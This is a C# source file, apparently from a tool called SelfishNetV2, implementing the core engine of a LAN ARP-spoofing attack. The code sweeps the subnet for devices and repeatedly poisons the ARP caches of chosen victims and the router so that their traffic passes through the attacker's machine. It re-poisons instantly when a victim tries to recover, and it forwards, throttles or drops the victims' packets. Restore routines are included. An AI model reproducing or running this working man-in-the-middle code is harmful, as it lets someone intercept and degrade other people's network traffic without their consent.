using System.Collections.Concurrent;
using SelfishNetV2.Core;
using SelfishNetV2.Drivers;

namespace SelfishNetV2.Engines;

/// <summary>
/// Shared engine machinery: ARP listener, discovery sweep, spoof scheduler,
/// packet forwarder, keep-alive/eviction janitor, stats sampler.
///
/// Wire protocol is IDENTICAL for both engines (frame bytes come from the
/// parity-tested <see cref="ArpFrameBuilder"/>); only these policies differ:
///   · cap policy        — <see cref="TryPassDown"/>/<see cref="TryPassUp"/>
///   · spoof burst shape — <see cref="SendInertSelfFrame"/>
///   · capture filter    — <see cref="IpFilter"/>
///   · frame classifier  — <see cref="Classify"/>
///
/// Threading: one capture session per handle ("arp" + "ip"), each with its own
/// receive thread; shutdown always follows breakloop → join → close (C2).
/// The catalog's eviction path unspoofs actively-spoofed devices first (C3).
/// </summary>
public abstract class EngineSessionBase : IEngineSession
{
    protected const int ArpTimeoutMs = 20;
    protected const int StatsIntervalMs = 1000;   // original timer1
    protected const int JanitorIntervalMs = 5000; // original timer2
    protected const double ProbeAfterSilentSec = 20;   // original keep-alive probe
    protected const double EvictAfterSilentSec = 350;  // original eviction (~5.8 min)
    protected const int UnspoofRepetitions = 35;       // original completeUnspoof

    protected readonly DeviceCatalog Catalog;
    protected readonly IPcapDriver Driver;
    private readonly object _lifecycle = new();
    private static bool _abiChecked;

    private PcapCaptureSession? _arp;   // "arp" handle: listener + spoof/restore sender
    private PcapCaptureSession? _ip;    // "ip" handle: forwarder
    private CancellationTokenSource? _lifeCts;   // Open → Close (housekeeping threads)
    private CancellationTokenSource? _shapeCts;  // shaping only (spoof scheduler)
    private Thread? _spoofThread;
    private Thread? _statsThread;
    private Thread? _janitorThread;
    private readonly ManualResetEventSlim _spoofWake = new(false);
    private readonly byte[] _txBuffer = new byte[65535]; // forwarder scratch (single-threaded per session)
    private readonly byte[] _probeBuffer = new byte[ArpFrameBuilder.FrameLength]; // janitor thread only
    private bool _abiArpFrameChecked, _abiIpFrameChecked;

    /// <summary>Every device we have actually poisoned (ip → mac), independent of the
    /// current Target flag. Healing always covers this set, so un-checking "Spoof"
    /// mid-session or evicting a silent device can never orphan a poisoned ARP cache.</summary>
    private readonly ConcurrentDictionary<uint, ulong> _poisoned = new();
    private long _lastAutoScanTicks;

    private long _forwardedDown, _forwardedUp, _dropped;
    private long _spoofSendFailures;
    private int _sendFailureReported;
    private int _receiveFatalReported;
    private volatile bool _shuttingDown;
    private volatile EngineRunState _state = EngineRunState.Closed;

    public abstract EngineKind Kind { get; }
    public EngineRunState State => _state;
    public AdapterInfo? Adapter { get; private set; }
    private volatile bool _discovering;
    public bool IsDiscovering => _discovering;
    public long ForwardedDown => Interlocked.Read(ref _forwardedDown);
    public long ForwardedUp => Interlocked.Read(ref _forwardedUp);
    public long Dropped => Interlocked.Read(ref _dropped);
    public long SpoofSendFailures => Interlocked.Read(ref _spoofSendFailures);

    public event EventHandler<EngineErrorEventArgs>? Error;
    public event EventHandler? StateChanged;
    public event EventHandler? DiscoveryCompleted;
    public event EventHandler? StatsTick;

    // ----- engine-specific policy hooks -----
    protected abstract string IpFilter { get; }
    protected abstract bool SendInertSelfFrame { get; }
    protected abstract PacketFlow Classify(ReadOnlySpan<byte> frame, in ForwardingContext ctx, out PacketMatch match);
    protected abstract bool TryPassDown(Device dev, int bytes);
    protected abstract bool TryPassUp(Device dev, int bytes);
    protected virtual void ConfigureIpCapture(PcapCaptureSession session) { }

    /// <summary>Re-poison cadence. Legacy keeps the original 5 000 ms; Modern re-poisons
    /// faster so a device can never keep the true router MAC for more than ~2 s.</summary>
    protected virtual int SpoofIntervalMs => 5000;

    /// <summary>React instantly when a victim ARPs for the gateway, the gateway answers,
    /// or the victim announces itself — closes the "device healed itself" race window.
    /// Legacy leaves this off to remain a faithful 2007 replica.</summary>
    protected virtual bool ReactivePoison => false;

    /// <summary>Background subnet sweep cadence (0 disables). Passive ARP learning is
    /// always active; this catches devices that stay silent.</summary>
    protected virtual int AutoScanIntervalMs => 60_000;

    /// <summary>Upper bound on hosts probed by one sweep. A /16 would otherwise
    /// take minutes; the expected /24 is unaffected.</summary>
    protected virtual int MaxSweepHosts => 4096;

    /// <summary>Delay between ARP requests (original pacing). Tests override to 0.</summary>
    protected virtual int DiscoveryPacingMs => 5;

    protected EngineSessionBase(DeviceCatalog catalog, IPcapDriver driver)
    {
        Catalog = catalog;
        Driver = driver;
    }

    // ================= lifecycle =================

    public bool Open(AdapterInfo adapter)
    {
        lock (_lifecycle)
        {
            if (_state != EngineRunState.Closed) CloseCore(healIfNeeded: true);
            _poisoned.Clear(); // any unhealed claims belong to the previous adapter/LAN
            _shuttingDown = false;
            Interlocked.Exchange(ref _spoofSendFailures, 0);
            Interlocked.Exchange(ref _sendFailureReported, 0);
            Interlocked.Exchange(ref _receiveFatalReported, 0);
            try
            {
                if (!_abiChecked)
                {
                    PcapAbiSelfTest.ValidateStructs();
                    _abiChecked = true;
                }
                Adapter = adapter;
                Catalog.AddOrUpdate(adapter.LocalIpKey, adapter.MacKey, isLocal: true);
                if (adapter.GatewayIpKey != 0)
                    Catalog.AddOrUpdate(adapter.GatewayIpKey, 0, isGateway: true);

                var arpCap = Driver.OpenLive(adapter.PcapName, "arp", timeoutMs: ArpTimeoutMs);
                _arp = new PcapCaptureSession(arpCap, "arp");
                _arp.PacketReceived += OnArpFrame;
                _arp.ReceiveError += OnReceiveError;
                _arp.Start();

                _lifeCts = new CancellationTokenSource();
                StartHousekeepingThreads(_lifeCts.Token);
                SetState(EngineRunState.Idle);

                // Active gateway MAC learning (original findMacRouter).
                if (adapter.GatewayIpKey != 0 && !GatewayMacKnown())
                    _ = ResolveMacAsync(adapter.GatewayIpKey);
                return true;
            }
            catch (PcapException ex)
            {
                RaiseError(DriverAccessProbe.LooksLikeAccessDenied(ex.Message)
                        ? EngineErrorKind.AccessDenied
                        : EngineErrorKind.DriverOpen,
                    ex.Message);
                CloseCore(healIfNeeded: false);
                return false;
            }
            catch (Exception ex)
            {
                RaiseError(EngineErrorKind.Internal, ex.Message);
                CloseCore(healIfNeeded: false);
                return false;
            }
        }
    }

    public void Close()
    {
        lock (_lifecycle) CloseCore(healIfNeeded: true);
    }

    private void CloseCore(bool healIfNeeded)
    {
        _state = EngineRunState.Closed;
        _shuttingDown = true;
        StopDiscovery();
        _shapeCts?.Cancel();
        _lifeCts?.Cancel();
        _spoofWake.Set();

        bool workersJoined = JoinThread(_spoofThread);
        _spoofThread = null;
        _ip?.Dispose(); _ip = null;   // breakloop → join → close (inside session)
        // Heal whenever asked — this also retries claims whose earlier heal failed
        // (UnspoofAll is a no-op when every claim has already been resolved).
        if (healIfNeeded)
            UnspoofAll();
        _poisoned.Clear();

        workersJoined &= JoinThread(_statsThread); _statsThread = null;
        workersJoined &= JoinThread(_janitorThread); _janitorThread = null;
        _shapeCts?.Dispose(); _shapeCts = null;
        _lifeCts?.Dispose(); _lifeCts = null;

        // If a worker did not join, its handle is leaked rather than closed under
        // a thread that may still be sending. This is the same C2 rule as the
        // receive session and only happens after a driver/thread bug.
        var arp = _arp;
        _arp = null;
        if (workersJoined) arp?.Dispose();

        Adapter = null;
        StateChanged?.Invoke(this, EventArgs.Empty);
    }

    public void Dispose() => Close();

    // ================= discovery =================

    public void StartDiscovery()
    {
        var adapter = Adapter;
        var arp = _arp;
        if (_discovering || adapter == null || arp == null) return;
        _discovering = true;
        Task.Run(() =>
        {
            try
            {
                Span<byte> buf = stackalloc byte[ArpFrameBuilder.FrameLength];
                int sent = 0;
                foreach (uint target in NetworkAdapterEnumerator.EnumerateSubnet(adapter.LocalIpKey, adapter.MaskKey))
                {
                    if (!_discovering || sent >= MaxSweepHosts) break;
                    if (target == adapter.LocalIpKey) continue;
                    ArpFrameBuilder.BuildRequest(buf, adapter.MacKey, adapter.LocalIpKey, target);
                    SendFrame(arp, buf);
                    sent++;
                    if (DiscoveryPacingMs > 0) Thread.Sleep(DiscoveryPacingMs);
                }
            }
            catch { /* capture closed mid-scan is non-fatal */ }
            finally
            {
                _discovering = false;
                try { DiscoveryCompleted?.Invoke(this, EventArgs.Empty); } catch { }
            }
        });
    }

    public void StopDiscovery() => _discovering = false;

    // ================= ARP listener (original arpListener) =================

    private void OnArpFrame(ReadOnlySpan<byte> frame)
    {
        var adapter = Adapter;
        if (adapter == null) return;
        if (!_abiArpFrameChecked)
        {
            _abiArpFrameChecked = true;
            if (!PcapAbiSelfTest.ValidateFrameHeader((uint)frame.Length, (uint)frame.Length, out string problem))
                RaiseError(EngineErrorKind.AbiMismatch, problem);
        }
        if (!ArpFrame.TryParse(frame, out var a)) return;
        if (a.EthSrcMac == adapter.MacKey) return;                    // skip our own frames

        // ---- reactive poison defense (Modern): win the ARP race ----
        // 1) a poisoned victim asks "who has gateway?": answer before it can keep the truth
        // 2) the router answers/announces to a poisoned victim: re-poison that victim
        // 3) a poisoned victim announces itself: restore our claim towards the router
        if (ReactivePoison && _state == EngineRunState.Shaping)
        {
            if (a.Opcode == ArpFrameBuilder.OpcodeRequest &&
                a.TargetIp == adapter.GatewayIpKey && _poisoned.ContainsKey(a.SenderIp))
            {
                ReactPoison(a.SenderIp);
            }
            else if (a.Opcode == ArpFrameBuilder.OpcodeReply)
            {
                if (_poisoned.ContainsKey(a.TargetIp)) ReactPoison(a.TargetIp);
                if (_poisoned.ContainsKey(a.SenderIp) && a.EthSrcMac != RouterMac()) ReactPoison(a.SenderIp);
            }
        }

        if (a.Opcode != ArpFrameBuilder.OpcodeReply) return;          // learn from replies only
        bool isGw = a.SenderIp == adapter.GatewayIpKey;
        bool isLocal = a.SenderIp == adapter.LocalIpKey;
        // Original learns the ROUTER MAC from the Ethernet source field; other
        // devices from the ARP sender field (identical on genuine replies).
        ulong mac = isGw ? a.EthSrcMac : a.SenderMac;
        Catalog.AddOrUpdate(a.SenderIp, mac, isGw, isLocal);
    }

    /// <summary>Immediate poison pair (×2 for race safety), both directions, for one victim.
    /// Runs on the ARP capture thread; sends are serialized by the capture session.</summary>
    private void ReactPoison(uint victimIpKey)
    {
        var adapter = Adapter;
        var arp = _arp;
        if (adapter == null || arp == null || adapter.GatewayIpKey == 0) return;
        ulong routerMac = RouterMac();
        if (routerMac == 0) return;
        if (!_poisoned.TryGetValue(victimIpKey, out ulong victimMac) || victimMac == 0) return;
        try
        {
            Span<byte> buf = stackalloc byte[ArpFrameBuilder.FrameLength];
            for (int i = 0; i < 2; i++)
            {
                ArpFrameBuilder.BuildPoison(buf, adapter.MacKey, adapter.GatewayIpKey, victimMac, victimIpKey);
                SendFrame(arp, buf);
                ArpFrameBuilder.BuildPoison(buf, adapter.MacKey, victimIpKey, routerMac, adapter.GatewayIpKey);
                SendFrame(arp, buf);
            }
        }
        catch { /* best effort */ }
    }

    // ================= shaping (spoof + forward) =================

    public async Task<bool> StartShapingAsync(CancellationToken ct = default)
    {
        var adapter = Adapter;
        if (adapter == null || _state == EngineRunState.Closed)
        {
            RaiseError(EngineErrorKind.Internal, "no adapter open");
            return false;
        }
        if (_state == EngineRunState.Shaping) return true;

        // A gateway is required for shaping. Without this guard the app would start
        // capturing/counting but silently never spoof (the old behaviour on VPN or
        // link-local adapters), which looks exactly like "the app does nothing".
        if (adapter.GatewayIpKey == 0)
        {
            RaiseError(EngineErrorKind.NoGateway, adapter.Name);
            return false;
        }

        // M2 hard gate: never shape/forward without a known gateway MAC.
        if (adapter.GatewayIpKey != 0 && !GatewayMacKnown())
        {
            await ResolveMacAsync(adapter.GatewayIpKey, attempts: 4, delayMs: 250, ct).ConfigureAwait(false);
            if (!GatewayMacKnown())
            {
                RaiseError(EngineErrorKind.GatewayMacUnknown, NetKeys.FormatIp(adapter.GatewayIpKey));
                return false;
            }
        }

        try
        {
            var ipCap = Driver.OpenLive(adapter.PcapName, IpFilter, timeoutMs: ArpTimeoutMs);
            var session = new PcapCaptureSession(ipCap, "ip");
            ConfigureIpCapture(session);
            session.PacketReceived += OnIpFrame;
            session.ReceiveError += OnReceiveError;

            Interlocked.Exchange(ref _receiveFatalReported, 0);
            _shapeCts?.Cancel(); _shapeCts?.Dispose();
            _shapeCts = new CancellationTokenSource();
            _spoofWake.Reset();
            _spoofThread = new Thread(() => SpoofLoop(_shapeCts.Token)) { IsBackground = true, Name = "spoof-tx" };
            _ip = session;
            _spoofThread.Start();   // immediate first burst, then every 5 s
            session.Start();
            SetState(EngineRunState.Shaping);
            return true;
        }
        catch (PcapException ex)
        {
            RaiseError(DriverAccessProbe.LooksLikeAccessDenied(ex.Message)
                    ? EngineErrorKind.AccessDenied
                    : EngineErrorKind.DriverOpen,
                ex.Message);
            return false;
        }
    }

    public Task StopAndHealAsync() => Task.Run(() =>
    {
        lock (_lifecycle)
        {
            if (_state != EngineRunState.Shaping) return;
            SetState(EngineRunState.Idle);
            _shapeCts?.Cancel();   // wake the spoof loop out of its wait…
            _spoofWake.Set();
            JoinThread(_spoofThread); _spoofThread = null;
            _ip?.Dispose(); _ip = null;   // breakloop → join → close
            UnspoofAll();
        }
    });

    private void SpoofLoop(CancellationToken ct)
    {
        int round = 0;
        while (!ct.IsCancellationRequested)
        {
            try { SendSpoofBurst(); } catch { /* send failures are non-fatal */ }
            // Two back-to-back rounds on start so the cache is poisoned instantly,
            // then the steady cadence.
            int wait = round < 2 ? 200 : SpoofIntervalMs;
            round++;
            try { _spoofWake.Wait(wait, ct); }
            catch (OperationCanceledException) { return; }
        }
    }

    /// <summary>One re-poison round over every targeted device (original Spoof per victim).</summary>
    protected virtual void SendSpoofBurst()
    {
        if (_shuttingDown) return;
        var adapter = Adapter;
        var arp = _arp;
        if (adapter == null || arp == null || adapter.GatewayIpKey == 0) return;
        ulong routerMac = RouterMac();
        if (routerMac == 0) return; // cannot poison the router without knowing it

        var targets = Catalog.SpoofTargets();
        var targetIps = new HashSet<uint>(targets.Count);
        foreach (var t in targets) targetIps.Add(t.IpKey);

        // A device that was poisoned but is no longer targeted (user unchecked Spoof)
        // is healed immediately — never left behind with a stale cache.
        foreach (var kv in _poisoned)
        {
            if (!targetIps.Contains(kv.Key))
                HealOne(kv.Key, kv.Value);
        }

        Span<byte> buf = stackalloc byte[ArpFrameBuilder.FrameLength];
        foreach (var v in targets)
        {
            if (_shuttingDown) break;
            _poisoned[v.IpKey] = v.MacKey;
            // 1. to victim: "router is at us"
            ArpFrameBuilder.BuildPoison(buf, adapter.MacKey, adapter.GatewayIpKey, v.MacKey, v.IpKey);
            SendFrame(arp, buf, reportFailure: true);
            // 2. to router: "victim is at us"
            ArpFrameBuilder.BuildPoison(buf, adapter.MacKey, v.IpKey, routerMac, adapter.GatewayIpKey);
            SendFrame(arp, buf, reportFailure: true);
            // 3. self-refresh: our listener re-learns the TRUE router MAC every round
            ArpFrameBuilder.BuildSelfRefresh(buf, adapter.MacKey, adapter.LocalIpKey, routerMac, adapter.GatewayIpKey);
            SendFrame(arp, buf, reportFailure: true);
            // 4. inert codegen leftover — Legacy only, for behavioral parity
            if (SendInertSelfFrame)
            {
                ArpFrameBuilder.BuildInertSelf(buf, adapter.MacKey, adapter.LocalIpKey, v.MacKey, v.IpKey);
                SendFrame(arp, buf, reportFailure: true);
            }
        }
    }

    /// <summary>Genuine restore pair for one device, <see cref="UnspoofRepetitions"/>×
    /// (original UnSpoof), followed by broadcast gratuitous announcements so even
    /// devices we never spoke to drop their stale entry.</summary>
    protected void UnspoofDevice(Device victim) => HealOne(victim.IpKey, victim.MacKey);

    /// <summary>Robust heal for a single device. Removes it from the poisoned set FIRST
    /// (so our own restore frames can never trigger reactive re-poisoning), resolves the
    /// gateway MAC if it is missing, then restores both directions and announces to the
    /// whole LAN. Returns true when the restore frames were emitted.</summary>
    protected bool HealOne(uint ipKey, ulong macKey, bool resolveRouter = true)
    {
        var adapter = Adapter;
        var arp = _arp;
        if (adapter == null || arp == null || adapter.GatewayIpKey == 0 || macKey == 0) return false;

        _poisoned.TryRemove(ipKey, out _);

        ulong routerMac = RouterMac();
        if (routerMac == 0)
        {
            // Last chance: the gateway must be known to heal. Resolution is expensive
            // (up to ~600 ms), so UnspoofAll resolves once and passes resolveRouter:false.
            if (resolveRouter) ResolveRouterMacForHeal();
            routerMac = RouterMac();
            if (routerMac == 0)
            {
                _poisoned[ipKey] = macKey; // keep the claim so the next stop/close retries
                return false;
            }
        }
        try
        {
            Span<byte> buf = stackalloc byte[ArpFrameBuilder.FrameLength];
            for (int i = 0; i < UnspoofRepetitions; i++)
            {
                // victim learns the router's real MAC
                ArpFrameBuilder.BuildRestore(buf, routerMac, adapter.GatewayIpKey, macKey, ipKey);
                SendWithRetry(arp, buf);
                // router learns the victim's real MAC
                ArpFrameBuilder.BuildRestore(buf, macKey, ipKey, routerMac, adapter.GatewayIpKey);
                SendWithRetry(arp, buf);
                // Pace the burst: Realtek/Npcap rejects very dense send bursts (error 31).
                Thread.Sleep(4);
            }
            // Broadcast gratuitous announcements: corrects any cache holder, including
            // devices that never answered our unicast restores.
            for (int i = 0; i < 3; i++)
            {
                ArpFrameBuilder.BuildGratuitousBroadcast(buf, routerMac, adapter.GatewayIpKey);
                SendWithRetry(arp, buf);
                ArpFrameBuilder.BuildGratuitousBroadcast(buf, macKey, ipKey);
                SendWithRetry(arp, buf);
                Thread.Sleep(4);
            }
            return true;
        }
        catch
        {
            _poisoned[ipKey] = macKey; // failed: keep it so shutdown retries
            return false;
        }
    }

    /// <summary>Heals every device we hold a poison claim for. The registry is
    /// authoritative: targets that were never poisoned need no repair, and healing
    /// each device exactly once keeps stop/switch deterministic (35 pairs + 3+3
    /// broadcast announcements per device).</summary>
    private void UnspoofAll()
    {
        if (_poisoned.Count == 0) return;
        // One gateway resolution attempt for the whole pass, never one per device —
        // this keeps shutdown time bounded when the gateway MAC is missing.
        if (RouterMac() == 0) ResolveRouterMacForHeal();
        foreach (var kv in _poisoned)
            HealOne(kv.Key, kv.Value, resolveRouter: false);
    }

    /// <summary>Gateway MAC lost mid-session: ask for it synchronously (heal path only).</summary>
    private void ResolveRouterMacForHeal()
    {
        var adapter = Adapter;
        var arp = _arp;
        if (adapter == null || arp == null || adapter.GatewayIpKey == 0) return;
        Span<byte> req = stackalloc byte[ArpFrameBuilder.FrameLength];
        for (int i = 0; i < 4 && RouterMac() == 0; i++)
        {
            ArpFrameBuilder.BuildRequest(req, adapter.MacKey, adapter.LocalIpKey, adapter.GatewayIpKey);
            SendWithRetry(arp, req);
            Thread.Sleep(150);
        }
    }

    private void SendWithRetry(PcapCaptureSession session, ReadOnlySpan<byte> frame)
    {
        if (SendFrame(session, frame)) return;
        Thread.Sleep(15); // Win32 error 31 ("device not functioning") is transient under burst
        SendFrame(session, frame);
    }

    /// <summary>
    /// Sends one frame and records driver rejections. Only the active spoof burst
    /// reports them to the UI (traffic control is genuinely broken then); best-effort
    /// paths such as healing count failures silently — a failed restore frame during
    /// a Wi-Fi hiccup must not scare the user with a modal dialog.
    /// </summary>
    private bool SendFrame(PcapCaptureSession session, ReadOnlySpan<byte> frame, bool reportFailure = false)
    {
        if (session.Send(frame) == 0) return true;
        Interlocked.Increment(ref _spoofSendFailures);
        if (reportFailure && Interlocked.Exchange(ref _sendFailureReported, 1) == 0)
            RaiseError(EngineErrorKind.SendFailed, session.Capture.LastError);
        return false;
    }

    // ================= forwarder (original redirector) =================

    private void OnIpFrame(ReadOnlySpan<byte> frame)
    {
        var adapter = Adapter;
        var ip = _ip;
        if (adapter == null || ip == null) return;
        if (!_abiIpFrameChecked)
        {
            _abiIpFrameChecked = true;
            if (!PcapAbiSelfTest.ValidateFrameHeader((uint)frame.Length, (uint)frame.Length, out string problem))
                RaiseError(EngineErrorKind.AbiMismatch, problem);
        }

        int len = frame.Length;
        ulong routerMac = RouterMac(); // re-read per packet, like the original
        var ctx = new ForwardingContext { LocalMac = adapter.MacKey, LocalIp = adapter.LocalIpKey, RouterMac = routerMac };
        PacketFlow flow = Classify(frame, ctx, out var match);

        switch (flow)
        {
            case PacketFlow.Own:
                if (Catalog.TryGetByIp(adapter.LocalIpKey, out var self)) self.AddUp(len);
                return;

            case PacketFlow.LocalDownload:
                if (Catalog.TryGetByIp(adapter.LocalIpKey, out self)) self.AddDown(len);
                return;

            case PacketFlow.Download:
            {
                if (!Catalog.TryGetByIp(match.DstIp, out var dev) || dev.IsLocalPc || dev.IsGateway) return;
                dev.AddDown(len);
                if (!dev.Redirect || !TryPassDown(dev, len)) { Interlocked.Increment(ref _dropped); return; }
                Forward(frame, len, dev.MacKey, adapter.MacKey, ip);
                Interlocked.Increment(ref _forwardedDown);
                return;
            }
            case PacketFlow.Upload:
            {
                if (routerMac == 0) { Interlocked.Increment(ref _dropped); return; } // never emit to broadcast (M2)
                if (!Catalog.TryGetByMac(match.SrcMac, out var dev) || dev.IsLocalPc || dev.IsGateway) return;
                dev.AddUp(len);
                if (!dev.Redirect || !TryPassUp(dev, len)) { Interlocked.Increment(ref _dropped); return; }
                Forward(frame, len, routerMac, adapter.MacKey, ip);
                Interlocked.Increment(ref _forwardedUp);
                return;
            }
        }
    }

    private void Forward(ReadOnlySpan<byte> frame, int len, ulong dstMac, ulong srcMac, PcapCaptureSession ip)
    {
        if (len > _txBuffer.Length) return;
        frame[..len].CopyTo(_txBuffer);
        NetKeys.WriteMac(_txBuffer, 0, dstMac);
        NetKeys.WriteMac(_txBuffer, 6, srcMac);
        ip.Send(_txBuffer.AsSpan(0, len));
    }

    // ================= housekeeping: stats + liveness =================

    private void StartHousekeepingThreads(CancellationToken outerCt)
    {
        _statsThread = new Thread(() => StatsLoop(outerCt)) { IsBackground = true, Name = "stats" };
        _janitorThread = new Thread(() => JanitorLoop(outerCt)) { IsBackground = true, Name = "janitor" };
        _statsThread.Start();
        _janitorThread.Start();
    }

    private void StatsLoop(CancellationToken ct)
    {
        _lastAutoScanTicks = Environment.TickCount64;
        while (!ct.IsCancellationRequested)
        {
            try { if (ct.WaitHandle.WaitOne(StatsIntervalMs)) return; } catch { return; }
            foreach (var dev in Catalog.Devices)
            {
                dev.LastDownSample = dev.ResetDownWindow();
                dev.LastUpSample = dev.ResetUpWindow();
            }
            try { StatsTick?.Invoke(this, EventArgs.Empty); } catch { }

            // Periodic background subnet sweep: new devices appear without manual scans.
            // Passive ARP learning runs always; this only catches silent hosts.
            if (AutoScanIntervalMs > 0 &&
                Environment.TickCount64 - _lastAutoScanTicks >= AutoScanIntervalMs)
            {
                _lastAutoScanTicks = Environment.TickCount64;
                if (!IsDiscovering && _state != EngineRunState.Closed)
                    StartDiscovery();
            }
        }
    }

    private void JanitorLoop(CancellationToken ct)
    {
        while (!ct.IsCancellationRequested)
        {
            try { if (ct.WaitHandle.WaitOne(JanitorIntervalMs)) return; } catch { return; }
            var adapter = Adapter;
            var arp = _arp;
            if (adapter == null || arp == null) continue;
            var now = DateTime.UtcNow;
            foreach (var dev in Catalog.Snapshot())
            {
                if (dev.IsLocalPc || dev.IsGateway || !dev.HasKnownMac) continue;
                double silent = (now - dev.LastSeenUtc).TotalSeconds;
                if (silent > EvictAfterSilentSec)
                {
                    // C3 fix: never orphan a poisoned victim — heal it before eviction.
                    if (_state == EngineRunState.Shaping &&
                        (dev.Targeted || _poisoned.ContainsKey(dev.IpKey)))
                        HealOne(dev.IpKey, dev.MacKey);
                    Catalog.Remove(dev.IpKey);
                }
                else if (silent > ProbeAfterSilentSec)
                {
                    // original 20 s unicast keep-alive probe
                    try
                    {
                        ArpFrameBuilder.BuildUnicastProbe(_probeBuffer, adapter.MacKey, adapter.LocalIpKey, dev.MacKey, dev.IpKey);
                        SendFrame(arp, _probeBuffer);
                    }
                    catch { }
                }
            }
        }
    }

    // ================= helpers =================

    protected ulong RouterMac() =>
        Adapter is { GatewayIpKey: not 0 } a &&
        Catalog.TryGetByIp(a.GatewayIpKey, out var gw) ? gw.MacKey : 0;

    protected bool GatewayMacKnown() => RouterMac() != 0;

    /// <summary>Active MAC resolution (original findMac): broadcast "who-has" until answered.</summary>
    protected async Task ResolveMacAsync(uint ipKey, int attempts = 4, int delayMs = 250, CancellationToken ct = default)
    {
        for (int i = 0; i < attempts; i++)
        {
            if (Catalog.TryGetByIp(ipKey, out var dev) && dev.HasKnownMac) return;
            SendArpRequest(ipKey);
            try { await Task.Delay(delayMs, ct).ConfigureAwait(false); }
            catch (OperationCanceledException) { return; }
        }
    }

    private void SendArpRequest(uint targetIpKey)
    {
        var adapter = Adapter;
        if (adapter == null) return;
        try
        {
            Span<byte> buf = stackalloc byte[ArpFrameBuilder.FrameLength];
            ArpFrameBuilder.BuildRequest(buf, adapter.MacKey, adapter.LocalIpKey, targetIpKey);
            var arp = _arp;
            if (arp != null) SendFrame(arp, buf);
        }
        catch { }
    }

    private void SetState(EngineRunState s)
    {
        _state = s;
        StateChanged?.Invoke(this, EventArgs.Empty);
    }

    private void RaiseError(EngineErrorKind kind, string detail) =>
        Error?.Invoke(this, new EngineErrorEventArgs(kind, detail));

    /// <summary>A dead capture thread must not leave victims poisoned to a PC that
    /// no longer forwards their traffic. Stop and heal once, off the capture thread.</summary>
    private void OnReceiveError(string detail)
    {
        RaiseError(EngineErrorKind.ReceiveError, detail);
        if (Interlocked.Exchange(ref _receiveFatalReported, 1) != 0) return;
        _ = Task.Run(async () =>
        {
            try { await StopAndHealAsync().ConfigureAwait(false); }
            catch { /* best effort: Close still retries any outstanding claims */ }
        });
    }

    private static bool JoinThread(Thread? t, int timeoutMs = 5000)
    {
        if (t is not { IsAlive: true }) return true;
        return t.Join(timeoutMs);
    }
}
